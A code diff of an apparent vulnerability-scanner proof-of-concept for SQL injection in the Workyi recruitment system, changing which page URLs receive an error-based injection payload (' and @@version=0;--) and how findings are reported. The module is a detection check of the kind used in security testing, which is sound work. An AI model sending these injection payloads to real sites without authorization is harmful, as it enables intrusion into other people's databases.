@@ -14,8 +14,9 @@ class Vuln(ABVuln):
         基于Asp.Net+MsSQL的开源高端人才系统,人才招聘程序.为创业者带来低投入高回报的人才系统。
         Workyi人才系统 页面参数过滤不严谨，导致SQL注入漏洞。
         /persondh/urgent.aspx?key=%27%20and%20@@version=0;--
+        /PersonDH/TuiJian.aspx?key=%27%20and%20@@version=0;--
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0116472'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'Workyi人才系统'  # 漏洞应用名称
@@ -49,64 +50,21 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            # ref: http://www.wooyun.org/bugs/wooyun-2010-0120283
-            # ref: http://www.wooyun.org/bugs/wooyun-2010-0116472
-            # ref: http://www.wooyun.org/bugs/wooyun-2010-0115157
-            # ref: http://www.wooyun.org/bugs/wooyun-2010-0115094
-
             hh = hackhttp.hackhttp()
-            # sql injection 1
-            # url = arg + 'map/showtag.aspx'
-            # postdata = "cenx=&ceny=&cenz=&maxX=&maxY=&minX=-1);%20waitfor%20delay%20'0:0:0'%20--%20&minY=&select1=%e4%bc%81%e4%b8%9a%e5%90%8d&select2=%e5%8c%97%e4%ba%ac&txtJingYan=&txtKey=1&txtLeiXing=&txtXueLi=&txtYueXin="
-            # code, head, res, errcode, _ = hh.http(url,post=postdata)
-            # if code == 200 and 'select' in res:
-            #     security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0120283 %s'%url)
-
             # sql injection 2
-            url = self.target + "/persondh/urgent.aspx?key=%27%20and%20@@version=0;--"
-            code, head, res, errcode, _ = hh.http(url)
+            url1 = self.target + "/persondh/urgent.aspx?key=%27%20and%20@@version=0;--"
+            code, head, res, errcode, _ = hh.http(url1)
             if code == 500 and 'SQL Server' in res:
                 #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0116472 %s'%url)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url1))
 
-            # sql injection 3
-            sql_injection_3 = 0
-
-            url = self.target + "/companydh/latest.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
-            code, head, res, errcode, _ = hh.http(url)
+            url2 = self.target + "/PersonDH/TuiJian.aspx?key=%27%20and%20@@version=0;--"
+            code, head, res, errcode, _ = hh.http(url2)
             if code == 500 and 'SQL Server' in res:
-                sql_injection_3 = 1
-            url = self.target + "/companydh/vip.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'SQL Server' in res:
-                sql_injection_3 = 1
-            url = self.target + \
-                "/companydh/recommand.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'SQL Server' in res:
-                sql_injection_3 = 1
-            url = self.target + "/companydh/picture.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27"
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'SQL Server' in res:
-                sql_injection_3 = 1
-            url = self.target + \
-                "/companydh/parttime.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'SQL Server' in res:
-                sql_injection_3 = 1
-            if sql_injection_3 == 1:
-                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115157 %s'%url)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
-
-            # sql injection 4
-            url = self.target + "/news/search.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
-            code, head, res, errcode, _ = hh.http(url)
-            if code == 500 and 'SQL Server' in res:
-                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115094 %s'%url)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0116472 %s'%url)
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=url2))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
